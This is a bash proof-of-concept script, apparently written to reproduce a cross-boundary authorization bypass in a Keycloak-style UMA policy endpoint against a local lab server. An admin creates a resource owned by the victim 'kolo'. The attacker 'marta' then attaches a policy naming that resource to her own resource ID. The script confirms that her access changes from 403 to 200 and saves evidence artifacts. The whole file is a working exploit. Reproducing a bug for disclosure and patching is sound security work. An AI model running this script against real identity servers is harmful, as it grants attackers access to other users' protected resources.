#!/usr/bin/env bash
set -euo pipefail

BASE_URL="http://127.0.0.1:8080"
READY_URL="http://127.0.0.1:9000/health/ready"
REALM="anypoc"
CLIENT_ID="resource-server-test"
CLIENT_SECRET="secret"
ATTACKER_USER="marta"
ATTACKER_PASS="password"
VICTIM_USER="kolo"
ADMIN_USER="admin"
ADMIN_PASS="adminpass"
ATTACKER_RESOURCE_ID="fd1f69f8-dec4-467f-9541-0b172738bdf5"

ROOT_DIR="$(cd "$(dirname "$0")" && pwd)"
ARTIFACT_DIR="$ROOT_DIR/artifacts"

rm -rf "$ARTIFACT_DIR"
mkdir -p "$ARTIFACT_DIR"

need_cmd() {
  command -v "$1" >/dev/null 2>&1 || {
    echo "missing required command: $1" >&2
    exit 1
  }
}

need_cmd curl
need_cmd jq
need_cmd python3

curl -fsS "$READY_URL" > "$ARTIFACT_DIR/ready.json"

get_token() {
  local realm="$1"
  shift
  curl -fsS -X POST "$BASE_URL/realms/$realm/protocol/openid-connect/token" "$@"
}

decode_jwt_payload() {
  local jwt="$1"
  python3 - "$jwt" <<'PY'
import base64
import json
import sys

jwt = sys.argv[1]
payload = jwt.split(".")[1]
payload += "=" * (-len(payload) % 4)
decoded = base64.urlsafe_b64decode(payload.encode())
print(json.dumps(json.loads(decoded), indent=2, sort_keys=True))
PY
}

ADMIN_TOKEN="$(
  get_token master \
    -d grant_type=password \
    -d client_id=admin-cli \
    -d username="$ADMIN_USER" \
    -d password="$ADMIN_PASS" | jq -r '.access_token'
)"

CLIENT_UUID="$(
  curl -fsS "$BASE_URL/admin/realms/$REALM/clients?clientId=$CLIENT_ID" \
    -H "Authorization: Bearer $ADMIN_TOKEN" | jq -r '.[0].id'
)"

VICTIM_USER_ID="$(
  curl -fsS "$BASE_URL/admin/realms/$REALM/users?username=$VICTIM_USER" \
    -H "Authorization: Bearer $ADMIN_TOKEN" | jq -r '.[0].id'
)"

RESOURCE_NAME="ANYPOC Kolo Resource Repro $(date +%s)"
POLICY_NAME="cross-boundary-repro-$(date +%s)"
jq -nc \
  --arg name "$RESOURCE_NAME" \
  --arg user_id "$VICTIM_USER_ID" \
  --arg user_name "$VICTIM_USER" \
  '{
    name: $name,
    ownerManagedAccess: true,
    owner: {
      id: $user_id,
      name: $user_name
    },
    scopes: [
      {name: "Scope A"},
      {name: "Scope B"},
      {name: "Scope C"}
    ],
    attributes: {
      anypoc_marker: ["repro-target"]
    }
  }' > "$ARTIFACT_DIR/create_resource_request.json"

curl -sS \
  -D "$ARTIFACT_DIR/create_resource_response.headers" \
  -o "$ARTIFACT_DIR/create_resource_response.json" \
  -X POST "$BASE_URL/admin/realms/$REALM/clients/$CLIENT_UUID/authz/resource-server/resource" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  --data @"$ARTIFACT_DIR/create_resource_request.json"

VICTIM_RESOURCE_ID="$(jq -r '._id' "$ARTIFACT_DIR/create_resource_response.json")"

ATTACKER_TOKEN="$(
  get_token "$REALM" \
    -d grant_type=password \
    -d client_id="$CLIENT_ID" \
    -d client_secret="$CLIENT_SECRET" \
    -d username="$ATTACKER_USER" \
    -d password="$ATTACKER_PASS" | tee "$ARTIFACT_DIR/attacker_token_response.json" | jq -r '.access_token'
)"

curl -sS \
  -o "$ARTIFACT_DIR/before_uma_response.json" \
  -w '%{http_code}' \
  -X POST "$BASE_URL/realms/$REALM/protocol/openid-connect/token" \
  -H "Authorization: Bearer $ATTACKER_TOKEN" \
  -d grant_type=urn:ietf:params:oauth:grant-type:uma-ticket \
  -d audience="$CLIENT_ID" \
  -d permission="$VICTIM_RESOURCE_ID" \
  > "$ARTIFACT_DIR/before_uma_status.txt"

jq -nc \
  --arg policy_name "$POLICY_NAME" \
  --arg victim_id "$VICTIM_RESOURCE_ID" \
  '{
    name: $policy_name,
    users: ["marta"],
    resources: [$victim_id]
  }' > "$ARTIFACT_DIR/create_policy_request.json"

curl -sS \
  -o "$ARTIFACT_DIR/create_policy_response.json" \
  -w '%{http_code}' \
  -X POST "$BASE_URL/realms/$REALM/authz/protection/uma-policy/$ATTACKER_RESOURCE_ID" \
  -H "Authorization: Bearer $ATTACKER_TOKEN" \
  -H "Content-Type: application/json" \
  --data @"$ARTIFACT_DIR/create_policy_request.json" \
  > "$ARTIFACT_DIR/create_policy_status.txt"

POLICY_ID="$(jq -r '.id' "$ARTIFACT_DIR/create_policy_response.json")"

curl -fsS \
  "$BASE_URL/realms/$REALM/authz/protection/uma-policy?resource=$VICTIM_RESOURCE_ID" \
  -H "Authorization: Bearer $ATTACKER_TOKEN" \
  > "$ARTIFACT_DIR/query_policy_response.json"

curl -sS \
  -o "$ARTIFACT_DIR/after_uma_response.json" \
  -w '%{http_code}' \
  -X POST "$BASE_URL/realms/$REALM/protocol/openid-connect/token" \
  -H "Authorization: Bearer $ATTACKER_TOKEN" \
  -d grant_type=urn:ietf:params:oauth:grant-type:uma-ticket \
  -d audience="$CLIENT_ID" \
  -d permission="$VICTIM_RESOURCE_ID" \
  > "$ARTIFACT_DIR/after_uma_status.txt"

AFTER_ACCESS_TOKEN="$(jq -r '.access_token' "$ARTIFACT_DIR/after_uma_response.json")"
decode_jwt_payload "$AFTER_ACCESS_TOKEN" > "$ARTIFACT_DIR/after_uma_access_token_payload.json"

BEFORE_STATUS="$(cat "$ARTIFACT_DIR/before_uma_status.txt")"
CREATE_STATUS="$(cat "$ARTIFACT_DIR/create_policy_status.txt")"
AFTER_STATUS="$(cat "$ARTIFACT_DIR/after_uma_status.txt")"

if [[ "$BEFORE_STATUS" != "403" ]]; then
  echo "expected pre-exploit denial, got status $BEFORE_STATUS" >&2
  exit 1
fi

if [[ "$CREATE_STATUS" != "200" ]]; then
  echo "expected policy creation success, got status $CREATE_STATUS" >&2
  exit 1
fi

if [[ "$AFTER_STATUS" != "200" ]]; then
  echo "expected post-exploit authorization success, got status $AFTER_STATUS" >&2
  exit 1
fi

jq -e --arg policy_id "$POLICY_ID" '.[0].id == $policy_id' \
  "$ARTIFACT_DIR/query_policy_response.json" > /dev/null

jq -e --arg victim_id "$VICTIM_RESOURCE_ID" '
  .authorization.permissions
  | map(select(.rsid == $victim_id))
  | length > 0
' "$ARTIFACT_DIR/after_uma_access_token_payload.json" > /dev/null

jq -nc \
  --arg base_url "$BASE_URL" \
  --arg realm "$REALM" \
  --arg attacker "$ATTACKER_USER" \
  --arg victim "$VICTIM_USER" \
  --arg attacker_resource_id "$ATTACKER_RESOURCE_ID" \
  --arg victim_resource_id "$VICTIM_RESOURCE_ID" \
  --arg policy_id "$POLICY_ID" \
  --arg before_status "$BEFORE_STATUS" \
  --arg create_status "$CREATE_STATUS" \
  --arg after_status "$AFTER_STATUS" \
  '{
    base_url: $base_url,
    realm: $realm,
    attacker: $attacker,
    victim: $victim,
    attacker_resource_id: $attacker_resource_id,
    victim_resource_id: $victim_resource_id,
    created_policy_id: $policy_id,
    before_status: ($before_status | tonumber),
    create_status: ($create_status | tonumber),
    after_status: ($after_status | tonumber),
    outcome: "reproduced"
  }' > "$ARTIFACT_DIR/summary.json"

cat <<EOF
Reproduction succeeded.
Victim resource: $VICTIM_RESOURCE_ID
Created policy: $POLICY_ID
Artifacts: $ARTIFACT_DIR
EOF
